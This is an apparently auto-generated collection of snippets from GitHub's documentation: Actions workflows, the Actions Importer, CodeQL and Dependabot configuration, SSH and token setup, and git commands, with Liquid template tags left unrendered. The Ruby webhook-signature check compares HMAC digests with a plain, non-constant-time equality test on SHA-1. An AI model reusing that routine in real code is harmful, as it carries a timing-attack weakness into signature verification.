Actions using gh actions-importer\nDESCRIPTION: This command migrates a Bitbucket pipeline to GitHub Actions, creating a pull request with the converted workflow. It requires specifying the workspace, repository, target URL (GitHub repository), and output directory.  The `gh` CLI and `actions-importer` extension must be installed.  Environment variables such as `GITHUB_ACCESS_TOKEN`, `GITHUB_INSTANCE_URL`, and `BITBUCKET_ACCESS_TOKEN` may be necessary.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer migrate bitbucket --workspace :workspace --repository :repo --target-url https://github.com/:owner/:repo --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Verifying Webhook Signature (Ruby)\nDESCRIPTION: This helper method `verify_webhook_signature` verifies that the webhook was sent by GitHub and not a malicious third party. It extracts the signature from the `X-HUB-SIGNATURE` header, computes the expected signature using the webhook secret and the raw payload, and compares the two. If they don't match, the request is rejected with a 401 Unauthorized status.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n    # Check X-Hub-Signature to confirm that this webhook was generated by\n    # GitHub, and not a malicious third party.\n    #\n    # GitHub uses the WEBHOOK_SECRET, registered to the GitHub App, to\n    # create the hash signature sent in the `X-HUB-Signature` header of each\n    # webhook. This code computes the expected hash signature and compares it to\n    # the signature sent in the `X-HUB-Signature` header. If they don't match,\n    # this request is an attack, and you should reject it. GitHub uses the HMAC\n    # hexdigest to compute the signature. The `X-HUB-Signature` looks something\n    # like this: 'sha1=123456'.\n    def verify_webhook_signature\n      their_signature_header = request.env['HTTP_X_HUB_SIGNATURE'] || 'sha1='\n      method, their_digest = their_signature_header.split('=')\n      our_digest = OpenSSL::HMAC.hexdigest(method, WEBHOOK_SECRET, @payload_raw)\n      halt 401 unless their_digest == our_digest\n\n      # The X-GITHUB-EVENT header provides the name of the event.\n      # The action value indicates the which action triggered the event.\n      logger.debug \"---- received event #{request.env['HTTP_X_GITHUB_EVENT']}\"\n      logger.debug \"----    action #{@payload['action']}\" unless @payload['action'].nil?\n    end\n```\n\n----------------------------------------\n\nTITLE: Single Deploy Job Without Building\nDESCRIPTION: This snippet shows a single deploy job without a separate build process. It checks out the code, sets up Pages, uploads the artifact (the entire directory), and then deploys to GitHub Pages.  Suitable when there is no building process.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/using-custom-workflows-with-github-pages.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n# ...\n\njobs:\n  # Single deploy job no building\n  deploy:\n    environment:\n      name: github-pages\n      url: {% raw %}${{steps.deployment.outputs.page_url}}{% endraw %}\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Pages\n        uses: actions/configure-pages@v5\n      - name: Upload Artifact\n{%- ifversion fpt or ghec %}\n        uses: actions/upload-pages-artifact@v3\n{%- elsif ghes %}\n        uses: actions/upload-pages-artifact@v2\n{%- endif %}\n        with:\n          # upload entire directory\n          path: '.'\n      - name: Deploy to GitHub Pages\n        id: deployment\n{%- ifversion fpt or ghec %}\n        uses: actions/deploy-pages@v4\n{%- elsif ghes %}\n        uses: actions/deploy-pages@v3\n{%- endif %}\n\n# ...\n```\n\n----------------------------------------\n\nTITLE: Configuring unregistered TLDs proxy exception - example\nDESCRIPTION: This shell command provides an example of how to configure the GitHub Enterprise Server instance to exclude `.example` and `.internal` top-level domains from the proxy. This can be useful for internal network resources that don't need to be accessed via the proxy server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-an-outbound-web-proxy-server.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config noproxy.exception-tld-list \".example,.internal\"\n```\n\n----------------------------------------\n\nTITLE: Snippet of features section in devcontainer.json\nDESCRIPTION: This JSON snippet shows a configuration for features within the `devcontainer.json` file.  Specifically it demonstrates how to configure the JSHint feature. This example shows the configuration to add a JSHint, a code quality tool for detecting errors in JavaScript code.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-nodejs-project-for-codespaces.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n   \"features\": {\n     \"ghcr.io/devcontainers-contrib/features/jshint:2\": {}\n   },\n\n   // Features to add to the dev container. More info: https://containers.dev/features.\n   // \"features\": {},\n```\n\n----------------------------------------\n\nTITLE: Adding SSH Key to ssh-agent - Shell\nDESCRIPTION: This command adds a specified SSH key to `ssh-agent`. The `YOUR-KEY` argument should be replaced with the path to your private SSH key file (e.g., `~/.ssh/id_rsa`). This makes the key available for agent forwarding.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nssh-add YOUR-KEY\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit with PAT in Ruby\nDESCRIPTION: This code snippet demonstrates how to instantiate an Octokit client using a personal access token (PAT) for authentication.  It requires the `octokit` gem. Replace `YOUR-TOKEN` with your actual PAT.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\noctokit = Octokit::Client.new(access_token: 'YOUR-TOKEN')\n```\n\n----------------------------------------\n\nTITLE: Convert Apple Certificate to Base64 (Shell)\nDESCRIPTION: This command converts an Apple signing certificate (.p12 file) to Base64 encoding and copies the output to the clipboard. It's used to store the certificate as a secret in {% data variables.product.prodname_dotcom %}.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbase64 -i BUILD_CERTIFICATE.p12 | pbcopy\n```\n\n----------------------------------------\n\nTITLE: Pushing Signed Commits to Remote Repository\nDESCRIPTION: This snippet shows how to push locally created commits to a remote repository on {% data variables.product.github %}. This assumes that the local repository is already configured to point to the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/signing-commits.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ git push\n# Pushes your local commits to the remote repository\n```\n\n----------------------------------------\n\nTITLE: Configuring a Runner Scale Set with Helm\nDESCRIPTION: This code snippet shows how to configure a runner scale set using Helm. It sets the installation name, namespace, GitHub configuration URL, and GitHub personal access token, then installs the chart from the GitHub Container Registry.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"{% raw %}${INSTALLATION_NAME}{% endraw %}\" \\\n    --namespace \"{% raw %}${NAMESPACE}{% endraw %}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"{% raw %}${GITHUB_CONFIG_URL}{% endraw %}\" \\\n    --set githubConfigSecret.github_token=\"{% raw %}${GITHUB_PAT}{% endraw %}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set\n```\n\n----------------------------------------\n\nTITLE: Reducing Nested Logic in Ruby\nDESCRIPTION: This Ruby code uses nested `if...else` statements to determine user access based on role, permissions, and activity status. Copilot Chat is used to rewrite the code using guard clauses, making it easier to follow and understand the logic.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/improving-code-readability-and-maintainability.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\ndef determine_access(user_role, has_permission, is_active)\n  if user_role == \"admin\"\n    if has_permission\n      if is_active\n        \"Active admin account with full access.\"\n      else\n        \"Inactive admin account.\"\n      end\n    else\n      \"Admin account lacks necessary permissions.\"\n    end\n  else\n    \"Access denied.\"\n  end\nend\n\nputs determine_access(\"admin\", true, true)\nputs determine_access(\"admin\", true, false)\nputs determine_access(\"admin\", false, true)\nputs determine_access(\"user\", true, true)\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef determine_access(user_role, has_permission, is_active)\n  return \"Access denied.\" unless user_role == \"admin\"\n  return \"Admin account lacks necessary permissions.\" unless has_permission\n  return \"Inactive admin account.\" unless is_active\n\n  \"Active admin account with full access.\"\nend\n\nputs determine_access(\"admin\", true, true)\nputs determine_access(\"admin\", true, false)\nputs determine_access(\"admin\", false, true)\nputs determine_access(\"user\", true, true)\n```\n\n----------------------------------------\n\nTITLE: Specifying Language-Specific Query Packs in Configuration File\nDESCRIPTION: This YAML snippet demonstrates how to specify language-specific CodeQL query packs in a configuration file using a nested map. This allows different packs to be used for analyzing different languages in the same project. The keys are language names (e.g., `javascript`, `java`), and the values are lists of packs for those languages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\n{% raw %}\npacks:\n  # Use these packs for JavaScript and TypeScript analysis\n  javascript:\n    - scope/js-pack1\n    - scope/js-pack2\n  # Use these packs for Java and Kotlin analysis\n  java:\n    - scope/java-pack1\n    - scope/java-pack2@v1.0.0\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Specifying CodeQL Database Location in YAML\nDESCRIPTION: This snippet shows how to specify the location for CodeQL databases using the `db-location` parameter in the `init` action. This is useful for custom workflow steps that require a specific database location. Requires the `actions/github-script` action.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    db-location: {% raw %}'${{ github.runner_temp }}/my_location'{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Example configuration output\nDESCRIPTION: Illustrates an example output of the `gh actions-importer configure` command, showcasing the prompts and the expected format for user input. The environment variables are successfully updated once the input is provided.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure\n✔ Which CI providers are you configuring?: Azure DevOps\nEnter the following values (leave empty to omit):\n✔ {% data variables.product.pat_generic_caps %} for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ {% data variables.product.pat_generic_caps %} for Azure DevOps: ***************\n✔ Base url of the Azure DevOps instance: https://dev.azure.com\n✔ Azure DevOps organization name: :organization\n✔ Azure DevOps project name: :project\nEnvironment variables successfully updated.\n```\n\n----------------------------------------\n\nTITLE: Building Docker Image for Pre-Receive Hook Environment\nDESCRIPTION: This shell command builds a Docker image from the Dockerfile.debian.  The -f flag specifies the Dockerfile to use, -t tag the image.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-environment.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ docker build -f Dockerfile.debian -t pre-receive.debian .\n> [+] Building 0.6s (6/6) FINISHED                                                                   docker:desktop-linux\n> => [internal] load build definition from Dockerfile.debian                                                              \n> => [1/2] FROM docker.io/library/debian:latest@sha256:80dd3c3b9c6cecb9f1667e9290b3bc61b78c2678c02cbdae5f0fea92cc6  \n> => [2/2] RUN apt-get update && apt-get install -y git bash curl                                            \n> => exporting to image                                                                                             \n> => => exporting layers                                                                                            \n> => => writing image sha256:b57af4e24082f3a30a34c0fe652a336444a3608f76833f5c5fdaf4d81d20c3cc                       \n> => => naming to docker.io/library/pre-receive.debian \n```\n\n----------------------------------------\n\nTITLE: Ignoring Patch Updates - YAML\nDESCRIPTION: This snippet demonstrates how to ignore patch updates for a specific dependency, in this case, Node types (`@types/node`), using the `update-types` option in the `dependabot.yml` file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nignore:\n  - dependency-name: \"@types/node\"\n    # Ignore patch updates for Node\n    update-types: [\"version-update:semver-patch\"]\n```\n\n----------------------------------------\n\nTITLE: Coding Guideline Example: Avoid Magic Numbers\nDESCRIPTION: This example demonstrates a coding guideline to avoid using magic numbers in code. It suggests defining numbers as constants or variables with meaningful names, and provides an example path pattern targeting Python files (`**/*.py`).\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/code-review/configuring-coding-guidelines.md#_snippet_1\n\n\n\n----------------------------------------\n\nTITLE: Creating a Configuration URL for a GitHub App\nDESCRIPTION: This snippet demonstrates how to create a URL with query parameters to preconfigure settings for a new GitHub App registration. It sets the app name, description, callback URL, enables request user authorization during installation, makes the app public, sets write permissions for checks, activates webhooks, and subscribes to check_run and check_suite webhook events.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-using-url-parameters.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n{% data variables.product.oauth_host_code %}/settings/apps/new?name=octocat-github-app&description=An%20Octocat%20App&callback_urls[]=https://example.com&request_oauth_on_install=true&public=true&checks=write&webhook_active=true&events[]=check_run&events[]=check_suite\n```\n\n----------------------------------------\n\nTITLE: Performing a Dry-Run Migration\nDESCRIPTION: This bash script command performs a dry-run migration of a Bitbucket pipeline to GitHub Actions, converting it to an equivalent workflow but without creating a pull request. The `gh actions-importer` CLI is used. The `--workspace` flag specifies the Bitbucket workspace, `--repository` specifies the repository, and `--output-dir` defines the directory for the generated workflow files.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Displaying Account Balance in Node.js\nDESCRIPTION: The `viewBalance()` function outputs the current account balance to the console, formatted to two decimal places. After displaying the balance, it calls `promptUser()` to display the menu again.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nfunction viewBalance() {\n    console.log(`Current balance: ${finalBalance.toFixed(2)}`);\n    promptUser();\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a model pack with extension targets\nDESCRIPTION: This YAML snippet defines a CodeQL model pack, specifying its name, version, extension targets, and data extensions. The `extensionTargets` property specifies which query packs the data extensions should be injected into, along with version ranges. The `dataExtensions` property points to the YAML files containing the data extensions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-repo/my-java-model-pack\nversion: 1.2.3\nextensionTargets:\n  codeql/java-all: ~1.2.3\n  codeql/util: ~4.5.6\ndataExtensions:\n  - models/**/*.yml\n```\n\n----------------------------------------\n\nTITLE: Specifying Languages for Copilot - XML\nDESCRIPTION: This XML snippet demonstrates how to specify individual languages for GitHub Copilot. It activates Copilot for Python and YAML while deactivating it for all other languages using the wildcard character and specific language entries.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_3\n\nLANGUAGE: XML\nCODE:\n```\n<application>\n  <component name=\"github-copilot\">\n    <languageAllowList>\n      <map>\n        <entry key=\"*\" value=\"false\" />\n        <entry key=\"Python\" value=\"true\" />\n        <entry key=\"YAML\" value=\"true\" />\n      </map>\n    </languageAllowList>\n  </component>\n</application>\n```\n\n----------------------------------------\n\nTITLE: Caching Dependencies with actions/cache\nDESCRIPTION: This YAML snippet demonstrates how to cache dependencies using the `actions/cache` action. It defines a cache path, a key based on the operating system and Gemfile.lock, and restore keys for partial cache hits.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-cache %}\n  with:\n    path: vendor/bundle\n    key: {% raw %}${{ runner.os }}-gems-${{ hashFiles('**/Gemfile.lock') }}{% endraw %}\n    restore-keys: |\n      {% raw %}${{ runner.os }}-gems-{% endraw %}\n- name: Bundle install\n  run: |\n    bundle config path vendor/bundle\n    bundle install --jobs 4 --retry 3\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log by Action\nDESCRIPTION: This snippet demonstrates how to use the `action` qualifier to filter audit log events based on the type of action performed. It provides examples of searching for events within a specific category and excluding events from a category, as well as searching for specific events within a category.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-users-across-your-enterprise.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\naction:team\n```\n\nLANGUAGE: text\nCODE:\n```\n-action:billing\n```\n\nLANGUAGE: text\nCODE:\n```\naction:team.create\n```\n\nLANGUAGE: text\nCODE:\n```\n-action:billing.change_email\n```\n\n----------------------------------------\n\nTITLE: Listing GitHub pull requests using gh pr list\nDESCRIPTION: This command lists the most recently created open pull requests for a specified repository. It supports filters for author and label. Requires the repository owner and name.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr list --repo OWNER/REPO\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr list --author \"@me\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr list --label LABEL-NAME\n```\n\n----------------------------------------\n\nTITLE: Adding SSH Key to Keychain (macOS) - Shell\nDESCRIPTION: This command adds an SSH key to the macOS Keychain, allowing it to be remembered across reboots. The `YOUR-KEY` argument should be replaced with the path to your private SSH key file.  The `--apple-use-keychain` option is specific to macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\nssh-add --apple-use-keychain YOUR-KEY\n```\n\n----------------------------------------\n\nTITLE: Installing Express dependency with npm\nDESCRIPTION: This command installs the Express library using npm, the Node.js package manager. Express is a framework for building web applications in Node.js and is required to run the webhook handler example.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nnpm install express\n```\n\n----------------------------------------\n\nTITLE: Amending a Commit During Rebase\nDESCRIPTION: This command is used within an interactive rebase session to amend the current commit with new changes. After making changes to the files, this command creates a new commit that replaces the old one.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/using-git-rebase-on-the-command-line.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit commit --amend\n```\n\n----------------------------------------\n\nTITLE: Excluding Configurations from Matrix Strategy - YAML\nDESCRIPTION: This YAML snippet demonstrates how to exclude specific configurations from a GitHub Actions matrix strategy using the `exclude` property.  The snippet defines a matrix with `os`, `version`, and `environment` dimensions and then excludes configurations where the `os` is `macos-latest`, `version` is `12`, and `environment` is `production`, and configurations where the `os` is `windows-latest` and `version` is `16`.  These exclusions prevent certain combinations of matrix variables from running.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-exclude.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nstrategy:\n  matrix:\n    os: [macos-latest, windows-latest]\n    version: [12, 14, 16]\n    environment: [staging, production]\n    exclude:\n      - os: macos-latest\n        version: 12\n        environment: production\n      - os: windows-latest\n        version: 16\nruns-on: {% raw %}${{ matrix.os }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Token Exchange Request Parameters\nDESCRIPTION: This snippet shows the required form-encoded parameters for a token exchange request. It includes the grant type, resource, subject token (GitHub JWT), and subject token type, which are required by RFC 8693 OAuth 2.0 Token Exchange.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/using-oidc-with-github-copilot-extensions.md#_snippet_2\n\nLANGUAGE: http request\nCODE:\n```\ngrant_type=urn:ietf:params:oauth:grant-type:token-exchange\n&resource=<https://your-service.com/resource>\n&subject_token=<github-jwt-token>\n&subject_token_type=urn:ietf:params:oauth:token-type:id_token\n```\n\n----------------------------------------\n\nTITLE: Configuring pub registry in dependabot.yml\nDESCRIPTION: This snippet configures a pub registry in `dependabot.yml`. It specifies the registry type, URL, and token using secrets. The `updates` section configures Dependabot to check for updates to pub dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  my-pub-registry:\n    type: pub-repository\n    url: https://example-private-pub-repo.dev/optional-path\n    token: ${{secrets.MY_PUB_TOKEN}}\nupdates:\n  - package-ecosystem: \"pub\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    registries:\n      - my-pub-registry\n```\n\n----------------------------------------\n\nTITLE: Variable File Path Name Example in Azure Pipelines YAML\nDESCRIPTION: This YAML snippet demonstrates how to define a variable file path in an Azure Pipelines configuration file. It includes defining variables in 'templates/vars.yml' and using them to specify a template path in 'azure-pipelines.yml'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n# File: azure-pipelines.yml\nvariables:\n- template: 'templates/vars.yml'\n\nsteps:\n- template: \"./templates/${{ variables.one }}\"\n```\n\n----------------------------------------\n\nTITLE: Encrypting a secret using Python\nDESCRIPTION: This snippet demonstrates how to encrypt a secret using Python and the PyNaCl library.  It defines a function `encrypt` that takes a public key and secret value as strings, encodes them to utf-8, encrypts the secret with the public key using `SealedBox`, and then returns the base64 encoded ciphertext. Requires the `pynacl` and `base64` libraries.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/encrypting-secrets-for-the-rest-api.md#_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\nfrom base64 import b64encode\nfrom nacl import encoding, public\n\ndef encrypt(public_key: str, secret_value: str) -> str:\n  \"\"\"Encrypt a Unicode string using the public key.\"\"\"\n  public_key = public.PublicKey(public_key.encode(\"utf-8\"), encoding.Base64Encoder())\n  sealed_box = public.SealedBox(public_key)\n  encrypted = sealed_box.encrypt(secret_value.encode(\"utf-8\"))\n  return b64encode(encrypted).decode(\"utf-8\")\n\nencrypt(\"YOUR_BASE64_KEY\", \"YOUR_SECRET\")\n```\n\n----------------------------------------\n\nTITLE: Making API request using installation access token with curl\nDESCRIPTION: This example demonstrates how to make an API request using curl with an installation access token. It includes the `Authorization` header with the `Bearer` token. Replace `INSTALLATION_ACCESS_TOKEN` with the actual token value. The request uses the `GET /meta` endpoint. It also specifies the `Accept` and `X-GitHub-Api-Version` headers.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/meta\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer INSTALLATION_ACCESS_TOKEN\" \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: Setting environment variable for PAT (Shell)\nDESCRIPTION: This snippet demonstrates how to set a personal access token as an environment variable named `CR_PAT`. This allows you to easily reference the token in subsequent commands without exposing it directly.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/authenticate-to-container-registry-steps.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nexport CR_PAT=YOUR_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Applying the configuration changes in bash\nDESCRIPTION: This command applies the configuration changes made via `ghe-config`. It is necessary after making any configuration changes to persist those changes across the GitHub Enterprise Server instance and requires access to the administrative shell.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-web-commit-signing.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Finding SSH Key Usage with IdentitiesOnly\nDESCRIPTION: This command uses `ssh` to connect to GitHub using a specific SSH key provided by the `-i` flag, forcing SSH to use only the key provided on the command line. The `-v` flag enables verbose mode. The `-o \"IdentitiesOnly=yes\"` option ensures that only the specified identity file is used for authentication, preventing the agent from offering other identities.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-key-already-in-use.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nssh -v -o \"IdentitiesOnly=yes\" -i ~/.ssh/id_rsa git@{% data variables.product.product_url %}\n```\n\n----------------------------------------\n\nTITLE: Debiting Account Function in Node.js\nDESCRIPTION: The `debitAccount()` function prompts the user for a debit amount. It validates the input, ensuring it is a positive number and that sufficient funds are available. If valid, it updates `finalBalance` and displays the new balance; otherwise, it shows an error message.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nfunction debitAccount() {\n    rl.question(\"Enter debit amount: \", (amount) => {\n        amount = parseFloat(amount);\n        if (!isNaN(amount) && amount > 0) {\n            if (finalBalance >= amount) {\n                finalBalance -= amount;\n                console.log(`Amount debited. New balance: ${finalBalance.toFixed(2)}`);\n            } else {\n                console.log(\"Insufficient funds for this debit.\");\n            }\n        } else {\n            console.log(\"Invalid amount. Please try again.\");\n        }\n        promptUser();\n    });\n}\n```\n\n----------------------------------------\n\nTITLE: Using Multiple Build Modes in Multi-language Repo (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure different build modes for different languages within a single repository. It uses a strategy matrix to define languages (C/C++, C#, Java) and their corresponding build modes (manual, autobuild, none). It then initializes CodeQL and conditionally executes a build step for C/C++ if the 'manual' build mode is specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nstrategy:\n  matrix:\n    include:\n      # Analyzes C and C++ code using the commands in `Build C and C++ code`\n      - language: c-cpp\n        build-mode: manual\n      # Analyzes C# code by automatically detecting a build\n      - language: csharp\n        build-mode: autobuild\n      # Analyzes Java code directly from the codebase without a build\n      - language: java-kotlin\n        build-mode: none # analyzes Java only\nsteps:\n- name: Checkout repository\n  uses: {% data reusables.actions.action-checkout %}\n\n# Initializes CodeQL tools and creates a codebase for analysis.\n- name: Initialize CodeQL\n  uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    languages: {% raw %}${{ matrix.language }}{% endraw %}\n- if: {% raw %}${{ matrix.build-mode == 'manual' }}{% endraw %}\n  name: Build C and C++ code\n  run: |\n    echo 'If you are using a \"manual\" build mode for one or more of the' \\\n      'languages you are analyzing, replace this with the commands to build' \\\n      'your code, for example:'\n    echo ' make bootstrap'\n    echo ' make release'\n    exit 1\n```\n\n----------------------------------------\n\nTITLE: Optimized Bash Script Using Find -exec\nDESCRIPTION: This is an optimized version of the original bash script. The `-exec ... +` option allows `find` to pass multiple files to `wc -l` at once, improving efficiency by reducing the number of `wc` calls.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nfind . -type f -name \"*.txt\" -exec wc -l {} +\n```\n\n----------------------------------------\n\nTITLE: Pushing Changes with Upstream Tracking\nDESCRIPTION: This command pushes the local branch to the remote repository and sets up an upstream tracking branch. Replace `YOUR-TOPIC-BRANCH` with the name of your topic branch. This allows using `git pull` and `git push` without specifying the remote and branch in the future.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngit push --set-upstream origin YOUR-TOPIC-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Handling Git Non-Fast-Forward Error with Fetch and Merge\nDESCRIPTION: This code snippet demonstrates how to resolve a non-fast-forward error by first fetching the latest changes from the remote repository and then merging them into the local branch. This approach allows you to integrate remote changes without overwriting your local work. Requires Git to be installed and configured. Input is a command line instruction. Output is the resolved state with the remote branch merged into the local branch.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/dealing-with-non-fast-forward-errors.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git fetch origin\n# Fetches updates made to an online repository\n$ git merge origin YOUR_BRANCH_NAME\n# Merges updates made online with your local work\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Client ID and Secret using 